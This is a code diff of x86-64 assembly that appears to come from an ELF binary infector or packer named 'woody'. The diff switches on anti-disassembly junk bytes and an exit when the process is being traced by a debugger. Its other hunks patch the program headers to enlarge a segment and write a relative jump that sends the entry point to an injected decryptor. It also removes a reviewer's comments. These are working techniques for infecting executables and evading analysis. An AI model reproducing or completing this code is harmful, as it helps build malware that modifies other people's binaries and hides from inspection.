@@ -33,9 +33,9 @@ decryptor:
 
 
 _start:
-  ; jmp ._start + 2
+  jmp ._start + 2
   ._start:
-  ; db '\x48\x81'
+  db '\x48\x81'
   push rdx
   push rsp
   ; deactivate signals?
@@ -108,7 +108,7 @@ _start:
           mov rdx, dbg_len
           syscall
       
-      ; jmp cleanup ; process is traced, exit SCOTT 
+      jmp cleanup ; process is traced, exit
 
   .not_traced:
       call .open_proc ; pushing db 'woody' on stack
@@ -364,7 +364,7 @@ _start:
     lea rsi, [r15 + EHDR]; rsi = ehdr
     mov rdx, EHDR_SIZE ; give it the size we wish to read
     mov r10, 0 ; offset 0
-    mov rax, SYS_PREAD64 ; scott why pread ?
+    mov rax, SYS_PREAD64
     syscall
 
     ; -- Check header
@@ -536,7 +536,7 @@ _start:
       mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)
       pop r13 ; restore r13
 
-      mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct ; SCOTT check
+      mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct
       add qword [r15 + PHDR_FILESZ], exit - decryptor + JMP_REL_SIZE ; adjust filesize
       add qword [r15 + PHDR_MEMSZ], exit - decryptor + JMP_REL_SIZE; adjust memsize
 
@@ -583,8 +583,8 @@ _start:
       ; Create patched jmp
       mov rdx, [r15 + PHDR_VADDR] ; load the virtual address
       add rdx, JMP_REL_SIZE ; add size of jmp rel instruction
-      sub r14, rdx ; scott
-      sub r14, v_stop - decryptor ; scott
+      sub r14, rdx
+      sub r14, v_stop - decryptor
       mov byte [r15 + JMP_REL], 0xe9 ; jmp instruction
       mov dword [r15 + JMP_REL + 1], r14d
 
